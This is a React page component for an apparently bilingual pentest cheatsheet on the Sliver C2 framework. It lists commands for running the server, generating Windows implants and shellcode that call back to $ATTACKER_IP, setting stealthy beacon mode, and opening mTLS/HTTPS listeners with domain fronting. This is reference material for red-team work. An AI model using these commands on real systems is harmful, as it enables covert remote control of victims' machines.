"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function SliverPage() {
  const { lang } = useLanguage();

  const sections = [
    {
      title: lang === "fr" ? "Installation & Serveur" : "Installation & Server",
      id: "setup",
      entries: [
        {
          cmd: "sliver-server",
          why: lang === "fr"
            ? "Démarrer le serveur Sliver : écoute sur 31337 par défaut pour les opérateurs."
            : "Start the Sliver server: listens on 31337 by default for operators.",
        },
        {
          cmd: "sliver-client",
          why: lang === "fr"
            ? "Connecter un opérateur au serveur Sliver : interface de gestion des implants."
            : "Connect an operator to the Sliver server: implant management interface.",
        },
        {
          cmd: "multiplayer",
          why: lang === "fr"
            ? "Activer le mode multiplayer : permettre à plusieurs opérateurs de se connecter simultanément."
            : "Enable multiplayer mode: allow multiple operators to connect simultaneously.",
        },
      ],
    },
    {
      title: lang === "fr" ? "Génération d'implants" : "Implant Generation",
      id: "implants",
      entries: [
        {
          cmd: "generate --mtls $ATTACKER_IP:8888 --os windows --arch amd64 --format exe --save /tmp/implant.exe",
          why: lang === "fr"
            ? "Générer un implant Windows mTLS : chiffrement mutuel TLS, difficile à inspecter."
            : "Generate a Windows mTLS implant: mutual TLS encryption, hard to inspect.",
        },
        {
          cmd: "generate --http $ATTACKER_IP --os windows --arch amd64 --format shellcode --save /tmp/implant.bin",
          why: lang === "fr"
            ? "Shellcode HTTP : pour injection dans un processus existant via une autre technique."
            : "HTTP shellcode: for injection into an existing process via another technique.",
        },
        {
          cmd: "generate beacon --mtls $ATTACKER_IP:8888 --os windows --seconds 60 --jitter 10",
          why: lang === "fr"
            ? "Mode beacon : callback périodique plutôt que connexion permanente, plus discret en prod."
            : "Beacon mode: periodic callback rather than permanent connection, stealthier in prod.",
        },
      ],
    },
    {
      title: lang === "fr" ? "Listeners & Sessions" : "Listeners & Sessions",
      id: "sessions",
      entries: [
        {
          cmd: "mtls --lport 8888",
          why: lang === "fr"
            ? "Ouvrir un listener mTLS sur le port 8888 pour recevoir les connexions des implants."
            : "Open an mTLS listener on port 8888 to receive implant connections.",
        },
        {
          cmd: "https --lport 443 --domain $DOMAIN",
          why: lang === "fr"
            ? "Listener HTTPS avec domain fronting optionnel : trafic C2 qui ressemble à du HTTPS légitime."
            : "HTTPS listener with optional domain fronting: C2 traffic that looks like legitimate HTTPS.",
        },
        {
          cmd: "sessions",
          why: lang === "fr"
            ? "Lister les sessions actives : voir tous les implants connectés et leur statut."
            : "List active sessions: see all connected implants and their status.",
        },
        {
          cmd: "use $SESSION_ID",
          why: lang === "fr"
            ? "Interagir avec une session : passer en mode interactif sur l'implant sélectionné."
            : "Interact with a session: enter interactive mode on the selected implant.",
        },
      ],
    },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">Pivoting</p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">Sliver C2</h1>
        <p className="mt-3 text-sm leading-7 text-muted-foreground">
          {lang === "fr"
            ? "Déployer et opérer des implants Sliver avec mTLS, HTTPS et mode beacon."
            : "Deploy and operate Sliver implants with mTLS, HTTPS and beacon mode."}
        </p>
      </header>
      <div className="space-y-10">
        {sections.map((section) => (
          <section key={section.id} id={section.id}>
            <h2 className="mb-4 border-b border-border pb-2 font-mono text-xs uppercase tracking-widest text-primary">
              {section.title}
            </h2>
            <div className="space-y-4">
              {section.entries.map((item) => (
                <CheatsheetCommandCard key={item.cmd} cmd={item.cmd} why={item.why} lang={lang} />
              ))}
            </div>
          </section>
        ))}
      </div>
    </div>
  );
}
